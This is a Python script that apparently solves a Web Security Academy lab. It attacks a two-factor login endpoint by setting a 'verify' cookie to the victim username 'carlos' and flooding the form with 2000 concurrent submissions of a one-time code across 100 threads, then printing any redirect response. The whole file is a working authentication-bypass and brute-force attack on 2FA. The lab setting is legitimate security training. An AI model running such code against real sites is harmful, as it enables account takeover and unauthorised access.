import requests
from tqdm import tqdm
from concurrent.futures import ThreadPoolExecutor

def check_otp(mfa_code, pbar):
    url = 'https://0a1f006d04b8494882d0529c0094004a.web-security-academy.net'

    with requests.session() as s:
        cookies = {
            'verify': 'carlos'
        }
        r = s.get(url=url+'/login2', cookies=cookies)
        data = {
            'mfa-code': mfa_code
        }
        r = s.post(url=url+'/login2', data=data, cookies=cookies)
        if r.status_code==302:
            print(r.text)

        # Update the progress bar
        pbar.update(1)

if __name__ == '__main__':
    mfa_codes = ['1998'] * 2000

    with tqdm(total=len(mfa_codes)) as pbar:
        # Run tasks with ThreadPoolExecutor
        with ThreadPoolExecutor(max_workers=100) as executor:
            for mfa_code in mfa_codes:
                executor.submit(check_otp, mfa_code, pbar)
